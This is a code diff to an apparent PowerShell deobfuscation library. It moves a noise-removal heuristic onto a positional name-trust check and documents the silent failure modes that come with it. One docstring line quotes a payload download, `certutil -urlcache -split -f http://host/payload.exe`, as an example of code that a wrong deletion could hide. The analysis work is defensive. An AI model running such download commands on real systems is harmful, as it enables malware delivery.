@@ -100,15 +100,40 @@ def _is_injected_noise_bareword(expr: Expression, cache: Ps1ModelCache) -> bool:
     so `try { certutil -urlcache -split -f http://host/payload.exe } catch { }` erased itself.
 
     The whole guess rests on the command table being the one the metadata describes, so it is only
-    made where the name is trustworthy: `may_trust_command_name` below. A script that dot-sources a
-    file, imports a module, defines an alias or runs `iex` can make any bareword resolve to real
-    code, and only the redefinitions spelled as a `function` reach the shadow set — the world
-    verdict the name-trust gate reads covers the rest, which is why the precondition sits here
-    rather than in another name-by-name list. The gate is deliberately the whole-run
-    `may_trust_command_name` and not its positional successor `may_trust_command_name_at`: purity
-    is a proof about a known built-in, where relaxing by position only widens what a proof already
-    covers, while this is a guess about an artifact, and a guess should not grow bolder with flow
-    analysis until that is measured as its own increment.
+    made where the name is trustworthy at this very statement: `may_trust_command_name_at` below.
+    A script that dot-sources a file, imports a module, defines an alias or runs `iex` can make any
+    bareword resolve to real code, and only the redefinitions spelled as a `function` reach the
+    shadow set — the world verdict the name-trust gate reads covers the rest, which is why the
+    precondition sits here rather than in another name-by-name list. Asking it at the position and
+    not over the whole run is what lets the guess reach an obfuscated script at all: a script that
+    rebinds anything anywhere refuses the whole-run question everywhere, and an obfuscated script
+    always rebinds something, so the padding standing above its first opener is precisely the
+    population the whole-run gate could never answer for.
+
+    Two properties go with that gate, and both fail silently.
+
+    A rebinding anywhere used to refuse everywhere, which made the verdict immune to the script
+    text running twice in one runspace. It is not any more: measured on 5.1, a block that carries
+    such a bareword and rebinds the name at its end emits the handler's word on the first entry and
+    the bareword's own residue on the second, so the second run does what the deletion says nothing
+    does. The transcript is the `& $s; & $s` row in `test.lib.scripts.ps1.corpus`, which is kept
+    from firing here only by the nesting refusal below — a block is not the root graph, so
+    `_position_in_root` places nothing in it. The forward flood behind the positional query is a
+    per-body one and carries no such edge, and
+    `refinery.lib.scripts.ps1.analysis.worldflow` refuses only the spellings a script names its own
+    path under. Where such a miss costs `values` and `effects` a wrongly deleted pure read, here it
+    costs a wrongly deleted command invocation with whatever arguments it carried.
+
+    And the blocks the positional gate newly reaches stand, by construction, above a payload the
+    analysis could not read, so the `reads_the_error_record` refusal below does not cover them: a
+    payload that reads `$Error.Count` observes the removal, and no scan over text this cannot
+    decode can find that read. The guard is worth having for the scripts it does cover; these are
+    not among them.
+
+    What is then left between a leaking script and a deleted `certutil` is the `=` marker alone,
+    where before there were two things. No native invocation is spelled `<name> =<one token>`, and
+    that is the whole of the defence — which is why `_carries_assignment_marker` is written as
+    narrowly as it is.
 
     The drop is also refused wherever the script can read the record the raise leaves behind, which
     is `Ps1CommandModel.reads_the_error_record`. A caught terminating error still fills `$Error`,
@@ -130,7 +155,7 @@ def _is_injected_noise_bareword(expr: Expression, cache: Ps1ModelCache) -> bool:
     if cache.commands.reads_the_error_record():
         return False
     world = cache.world_reach
-    if name_lower in KNOWN_CMDLETS or not world.may_trust_command_name(name_lower):
+    if name_lower in KNOWN_CMDLETS or not world.may_trust_command_name_at(name_lower, expr):
         return False
     if any(sep in name for sep in ('\\', '/', ':')):
         return False
